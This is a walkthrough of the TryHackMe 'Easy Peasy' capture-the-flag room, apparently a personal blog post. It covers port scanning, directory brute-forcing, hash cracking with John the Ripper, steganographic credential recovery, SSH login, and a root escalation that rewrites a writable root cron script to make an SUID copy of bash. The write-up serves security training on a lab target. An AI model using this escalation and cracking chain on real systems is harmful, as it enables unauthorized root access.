---
slug: easy-peasy
title: Easy Peasy
authors: [hueami]
tags: [tryhackme, ctf]
comments: true
---
Welcome to my first write-up for the CTF room [Easy Peasy on tryhackme](https://tryhackme.com/room/easypeasyctf). Let's dive into the fascinating world of Capture The Flag challenges!

### Task 1: Enumeration through nmap

<!-- truncate -->

1. Our first step is to understand the landscape we're dealing with. We'll start by enumerating all the ports using nmap.

```bash
$ sudo nmap 10.10.160.74 -p0-

Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 21:33 CET
Nmap scan report for 10.10.160.74
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
```
This fast enumeration over all ports gives us our first piece of the puzzle - the number of open ports.
Next, we perform a detailed scan over the open ports.

```bash
sudo nmap 10.10.160.74 -p080,6498,65524 -sV -A -T5

Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 21:40 CET
Nmap scan report for 10.10.160.74
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.43 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.18 ms 10.8.0.1
2   51.32 ms 10.10.5.48
```
This information helps us to answer questions 2 and 3.

### Task 2: Compromising the machine 
With our enumeration complete, we move on to compromising the machine.

The room provides a task file that appears to be a wordlist. We’ll save this for later use.
We then proceed to scan subdirectories using feroxbuster, with the directory wordlist `SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt``.
```bash
$ feroxbuster -u http://10.10.160.74 -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Feroxbuster uncovers a directory with another subdirectory. Both directories contain an image, but only the second subdirectory contains hidden information in the source code.

The string appears to be base64 encoded, so we decode it:

```bash
echo ZmxhZ3tmMXJz**********== | base64 -d
```
Decoded string is the flag asked for in question 1.

The two images do not seem to contain valuable information. I checked the EXIF information and tried to find some hidden messages with an [steganography tool](https://futureboy.us/stegano/decinput.html), but had no success. So, I continued to look at the Apache webserver running on port 65524.

The index.html served on port 65524 displayed a default Apache site. The flag for question 3 is hidden in the text.

The robots.txt file (nikto found it) shows me a strange string with the message that this agent may enter. Using it as a custom user agent does not work. I tried several online hash rainbow tables, e.g. [crackstation](https://crackstation.net/), [nitrxgen](https://www.nitrxgen.net/), [hashes.com](https://hashes.com/en/decrypt/hash), [md5hashing](https://md5hashing.net). Search in all types of [md5hashing](https://md5hashing.net) finally finds the flag for question 2.

Looking at the sourcecode revealed a hidden message:
`<p hidden>its encoded with ba....:ObsJmP173N2X6d**********</p>`
I tried several baseX encodings with [cyberchef](https://gchq.github.io/CyberChef/) until I had a hit: `/n0th1ng**********` - looks like a directory and the answer to question 4.

There are two images in the subdirectory. The binary code shown is rubbish. The steganography tool is not able to find a message. In the page source in the subdirectory, I found the string `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e********`. I tried [crackstation](https://crackstation.net/) - no results. So I ran John the Ripper on the string with the previously saved wordlist `easypeasy.txt`:

```bash
$ echo 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e******** > easypeasy
$ john --wordlist=~/Downloads/easypeasy.txt ./easypeasy
```
John gets a result: `m*****************b`
This is the answer for question 5.

I try this password with the two images in the [steganography tool](https://futureboy.us/stegano/decinput.html) - the binary code image is a hit. I get a username `b****g` and a binary encoded password `i**************************y`. The password is the answer for question 6.

With a username and a password, I try to use them for the SSH service that Nmap found on port 6498. It works perfectly fine. The user flag is located in the user’s home as expected, but it looks wrong:

```bash
$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
s********************}
```

This is a hint on the used encryption - the Caesar (or ROT) cipher. The first letter s should be an f for flag, I guessed. That meant I had to rotate by 13 characters - ROT13. Flag found and question 7 solved.

A message caught my attention:

```bash
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
```
This suggested that there might be a cron job running that I could exploit to gain root access. To confirm this, I checked the crontab file:

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
Indeed, there was a shell script named `.mysecretcronjob.sh` running every minute with root permissions. Checking the permissions of the file showed that the owner was the current user and they had permission to write to this file. This opened up a lot of options for exploitation. I decided to modify the script to make a copy of bash and set the SUID bit, so it would run with its owner’s (root) permissions.

```bash
echo 'cp /bin/bash /var/www/bash; chmod +s /var/www/bash' > /var/www/.mysecretcronjob.sh
```
A few moments later, the modified bash was available. Executing it with the argument `-p` ensured that it did not drop the root privilege, as it would normally do. With the root shell, I was now able to read the root flag:

```bash
$ cat /root/.root.txt
```
The flag looked like there would be a hash to crack again - but fortunately, the form for question 8 accepted it and I did not have to crack a hash again.

And that concludes our journey through this CTF challenge. I hope you found it insightful and engaging. Stay tuned for more adventures in the world of IT security!